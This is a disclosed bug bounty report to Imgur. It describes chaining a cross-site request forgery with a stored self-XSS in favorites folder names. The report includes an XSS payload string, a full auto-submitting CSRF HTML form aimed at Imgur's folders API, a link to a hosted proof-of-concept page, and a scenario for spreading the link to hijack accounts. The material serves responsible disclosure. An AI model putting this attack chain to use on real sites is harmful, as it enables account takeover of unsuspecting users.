# CSRF leads to a stored self xss

## Report Details
- **Report ID**: 323005
- **URL**: https://hackerone.com/reports/323005
- **State**: Closed
- **Severity**: low
- **Submitted**: 2018-03-06T23:34:16.814Z
- **Disclosed**: 2019-08-30T05:31:40.974Z

## Reporter
- **Username**: hogarth45
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: imgur

## Vulnerability Information
Followup from #311460

#Summary
Self xss and CSRF are both out of scope, but when paired it is possible to create an attack on a user.

#Description
A favorites folder with an xss payload for a name will launch when saving an image to said folder.

This can be verified by following these steps
* Visit your favorites
* Create New Folder
* Change name to
```
"'><img src=x onerror=prompt(1)>
```
* Save
* Visit a photo
* Click the little plus next to the heart on bottom left of image
* Add to the folder
* xss will launch

Since self xss is out of scope, we will need a method of delivering this attack to a user.
This can be done via a CSRF to create a favorites folder.

# POC

Using a form like so to create the CSRF:
```
<html>
<body onload='document.forms[0].submit()'>
  <form method='POST' enctype='application/json' action='https://api.imgur.com/3/folders'>
    <input name='name' value='New Test"><img src=x onerror=prompt(2)>'>
    <input name='is_private' value='false'>
  </form>
</body>
</html>
```

Or be logged into your imgur account and visit

http://blackdoorsec.net/sandbox/imgur2.html

This will create the folder with an xss name that can be used to attack an account.

## Impact

account hijacking
since a user would still need to add an image to the folder for the attack to work, the success rate will be lower than normal

#Scenerio
since reddit/imgur communities overlap malicious links containing the CSRF could be sent throughout the site. out of the few thousand hits the link would get, i imagine there would be several successful compromised imgur accounts.

## Attachments
No attachments
